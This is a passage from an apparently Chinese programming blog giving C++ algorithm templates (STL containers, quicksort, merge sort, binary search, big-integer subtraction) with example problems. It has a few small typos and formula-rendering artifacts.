第一个元素</span><br><span class="line">    second, 第二个元素</span><br><span class="line">    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）</span><br><span class="line"></span><br><span class="line">string，字符串</span><br><span class="line">    <span class="built_in">size</span>()/<span class="built_in">length</span>()  返回字符串长度</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">substr</span>(起始下标，(子串长度))  返回子串</span><br><span class="line">    <span class="built_in">c_str</span>()  返回字符串所在字符数组的起始地址</span><br><span class="line"></span><br><span class="line">queue, 队列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  向队尾插入一个元素</span><br><span class="line">    <span class="built_in">front</span>()  返回队头元素</span><br><span class="line">    <span class="built_in">back</span>()  返回队尾元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出队头元素</span><br><span class="line"></span><br><span class="line">priority_queue, 优先队列，默认是大根堆</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  插入一个元素</span><br><span class="line">    <span class="built_in">top</span>()  返回堆顶元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出堆顶元素</span><br><span class="line">    定义成小根堆的方式：priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; q;</span><br><span class="line"></span><br><span class="line">stack, 栈</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">push</span>()  向栈顶插入一个元素</span><br><span class="line">    <span class="built_in">top</span>()  返回栈顶元素</span><br><span class="line">    <span class="built_in">pop</span>()  弹出栈顶元素</span><br><span class="line"></span><br><span class="line">deque, 双端队列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">front</span>()/<span class="built_in">back</span>()</span><br><span class="line">    <span class="built_in">push_back</span>()/<span class="built_in">pop_back</span>()</span><br><span class="line">    <span class="built_in">push_front</span>()/<span class="built_in">pop_front</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    []</span><br><span class="line"></span><br><span class="line">set, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列</span><br><span class="line">    <span class="built_in">size</span>()</span><br><span class="line">    <span class="built_in">empty</span>()</span><br><span class="line">    <span class="built_in">clear</span>()</span><br><span class="line">    <span class="built_in">begin</span>()/<span class="built_in">end</span>()</span><br><span class="line">    ++, -- 返回前驱和后继，时间复杂度 <span class="built_in">O</span>(logn)</span><br><span class="line"></span><br><span class="line">    set/<span class="function">multiset</span></span><br><span class="line"><span class="function">        <span class="title">insert</span><span class="params">()</span>  插入一个数</span></span><br><span class="line"><span class="function">        <span class="title">find</span><span class="params">()</span>  查找一个数</span></span><br><span class="line"><span class="function">        <span class="title">count</span><span class="params">()</span>  返回某一个数的个数</span></span><br><span class="line"><span class="function">        <span class="title">erase</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="params">(<span class="number">1</span>)</span> 输入是一个数x，删除所有x   <span class="title">O</span><span class="params">(k + logn)</span></span></span><br><span class="line"><span class="function">            <span class="params">(<span class="number">2</span>)</span> 输入一个迭代器，删除这个迭代器</span></span><br><span class="line"><span class="function">        <span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="title">lower_bound</span><span class="params">(x)</span>  返回大于等于x的最小的数的迭代器</span></span><br><span class="line"><span class="function">            <span class="title">upper_bound</span><span class="params">(x)</span>  返回大于x的最小的数的迭代器</span></span><br><span class="line"><span class="function">    map/multimap</span></span><br><span class="line"><span class="function">        <span class="title">insert</span><span class="params">()</span>  插入的数是一个pair</span></span><br><span class="line"><span class="function">        <span class="title">erase</span><span class="params">()</span>  输入的参数是pair或者迭代器</span></span><br><span class="line"><span class="function">        <span class="title">find</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        []  注意multimap不支持此操作。 时间复杂度是 <span class="title">O</span><span class="params">(logn)</span></span></span><br><span class="line"><span class="function">        <span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">unordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表</span></span><br><span class="line"><span class="function">    和上面类似，增删改查的时间复杂度是 <span class="title">O</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    不支持 <span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span>， 迭代器的++，--</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">bitset, 圧位</span></span><br><span class="line"><span class="function">    bitset&lt;10000&gt; s</span>;</span><br><span class="line">    ~, &amp;, |, ^</span><br><span class="line">    &gt;&gt;, &lt;&lt;</span><br><span class="line">    ==, !=</span><br><span class="line">    []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">count</span>()  返回有多少个<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">any</span>()  判断是否至少有一个<span class="number">1</span></span><br><span class="line">    <span class="built_in">none</span>()  判断是否全为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span>()  把所有位置成<span class="number">1</span></span><br><span class="line">    <span class="built_in">set</span>(k, v)  将第k位变成v</span><br><span class="line">    <span class="built_in">reset</span>()  把所有位变成<span class="number">0</span></span><br><span class="line">    <span class="built_in">flip</span>()  等价于~</span><br><span class="line">    <span class="built_in">flip</span>(k) 把第k位取反</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h2><h3 id="模板："><a href="#模板：" class="headerlink" title="模板："></a>模板：</h3><p><img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015224719590-1433219824.gif" class="lazyload" data-srcset="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015224719590-1433219824.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//递归的终止情况</span></span><br><span class="line">    <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//第一步：分成子问题</span></span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l + r &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i++; <span class="keyword">while</span>(q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j--; <span class="keyword">while</span>(q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二步：递归处理子问题</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j), <span class="built_in">quick_sort</span>(q, j + <span class="number">1</span>, r);</span><br><span class="line">    <span class="comment">//第三步：子问题合并.快排这一步不需要操作，但归并排序的核心在这一步骤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>给定你一个长度为 nn 的整数数列。</p><p>请你使用快速排序对这个数列按照从小到大进行排序。</p><p>并将排好序的数列按顺序输出。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入共两行，第一行包含整数 nn。</p><p>第二行包含 nn 个整数（所有整数均在 1∼1091∼109 范围内），表示整个数列。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出共一行，包含 nn 个整数，表示排好序的数列。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n≤1000001≤n≤100000</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">3 1 2 4 5</span><br></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5</span><br></pre></td></tr></table></figure><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l&gt;=r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> x=q[l+r&gt;&gt;<span class="number">1</span>],i=l<span class="number">-1</span>,j=r+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i++;<span class="keyword">while</span>(q[i]&lt;x);</span><br><span class="line">        <span class="keyword">do</span> j--;<span class="keyword">while</span>(q[j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) <span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(q,l,j);</span><br><span class="line">    <span class="built_in">quick_sort</span>(q,j+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n); <span class="comment">//scanf比cin速度更快</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span> (q,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p><img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015230557043-37375010.gif" class="lazyload" data-srcset="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015230557043-37375010.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//递归的终止情况</span></span><br><span class="line">    <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第一步：分成子问题</span></span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二步：递归处理子问题</span></span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l, mid ), <span class="built_in">merge_sort</span>(q, mid + <span class="number">1</span>, r);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第三步：合并子问题</span></span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>, tmp[r - l + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">        <span class="keyword">if</span>(q[i] &lt;= q[j]) tmp[k++] = q[i++];</span><br><span class="line">        <span class="keyword">else</span> tmp[k++] = q[j++];</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid) tmp[k++] = q[i++];</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= r) tmp[k++] = q[j++];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例题同上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> q[N],tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">   <span class="type">int</span> mid = l + r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">   <span class="built_in">merge_sort</span>(q,l,mid);</span><br><span class="line">   <span class="built_in">merge_sort</span>(q,mid+<span class="number">1</span>,r);</span><br><span class="line">   </span><br><span class="line">   <span class="type">int</span> k=<span class="number">0</span>,i=l,j=mid+<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=r)</span><br><span class="line">     <span class="keyword">if</span>(q[i]&lt;=q[j]) tmp[k++]=q[i++];</span><br><span class="line">     <span class="keyword">else</span> tmp[k++]=q[j++];</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">while</span>(i&lt;=mid) tmp[k++]=q[i++];</span><br><span class="line">   <span class="keyword">while</span>(j&lt;=r)  tmp[k++]=q[j++];</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> (i=l,j=<span class="number">0</span>;i&lt;=r;i++,j++) q[i]=tmp[j]; </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;C++</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n); </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span> (q,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="二分"><a href="#二分" class="headerlink" title="二分"></a>二分</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="comment">/* ... */</span>&#125; <span class="comment">// 检查x是否满足某种性质</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bsearch_1</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;    <span class="comment">// check()判断mid是否满足性质</span></span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bsearch_2</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>给定一个按照升序排列的长度为 nn 的整数数组，以及 qq 个查询。</p><p>对于每个查询，返回一个元素 kk 的起始位置和终止位置（位置从 00 开始计数）。</p><p>如果数组中不存在该元素，则返回 <code>-1 -1</code>。</p><h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含整数 nn 和 qq，表示数组长度和询问个数。</p><p>第二行包含 nn 个整数（均在 1∼100001∼10000 范围内），表示完整数组。</p><p>接下来 qq 行，每行包含一个整数 kk，表示一个询问元素。</p><h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>共 qq 行，每行包含两个整数，表示所求元素的起始位置和终止位置。</p><p>如果数组中不存在该元素，则返回 <code>-1 -1</code>。</p><h4 id="数据范围-1"><a href="#数据范围-1" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n≤1000001≤n≤100000<br>1≤q≤100001≤q≤10000<br>1≤k≤100001≤k≤10000</p><h4 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6 3</span><br><span class="line">1 2 2 3 3 4</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h4 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3 4</span><br><span class="line">5 5</span><br><span class="line">-1 -1</span><br></pre></td></tr></table></figure><p>exp</p><p>在数组中查找某元素，找不到就输出-1，找到了就输出不小于该元素的最小位置和不大于该元素的最大位置。所以，需要写两个二分，一个需要找到&gt;&#x3D;x的第一个数，另一个需要找到&lt;&#x3D;x的最后一个数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> l=<span class="number">0</span>,r=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l&lt;r) <span class="comment">//找到&lt;=x的第一个数 右边界</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> mid =l+r &gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(q[mid]&gt;=x) r=mid;</span><br><span class="line">            <span class="keyword">else</span> l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q[l]!=x)cout&lt;&lt;<span class="string">&quot;-1 -1&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;l&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="type">int</span> l=<span class="number">0</span>,r=n<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&lt;r) <span class="comment">//&gt;=x的最后一个数 左边界</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> mid=l+r+<span class="number">1</span>&gt;&gt;<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(q[mid]&lt;=x) l=mid;</span><br><span class="line">                <span class="keyword">else</span> r=mid<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;l&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="高精"><a href="#高精" class="headerlink" title="高精"></a>高精</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="度减法"><a href="#度减法" class="headerlink" title="度减法"></a>度减法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        t = A[i] - t;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (t &lt; <span class="number">0</span>) t = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> t = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">    <span class="keyword">return</span> 